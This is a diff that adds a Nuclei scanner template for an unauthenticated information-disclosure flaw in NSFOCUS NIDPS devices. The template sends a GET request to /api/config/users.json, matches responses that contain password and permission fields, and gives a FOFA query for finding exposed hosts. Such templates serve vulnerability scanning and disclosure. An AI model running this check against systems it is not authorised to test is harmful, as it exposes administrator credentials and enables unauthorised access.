@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - permission
+            - mail
+            - password
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/config/users.json HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+id: nsfocus-users-Information-disclosure
+info:
+    author: Superhero
+    description: |-
+        fofa: title="NSFOCUS NIDPS"
+        绿盟 users存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取网站后台系统用户密码等敏感信息，从而登录网站后台系统，使网站处于极不安全的状态。
+    name: 绿盟 users 信息泄露漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/Fh7jDgIH7z5qYo4NyJqAfg
+    severity: medium
+    tags:
+        - Information disclosure
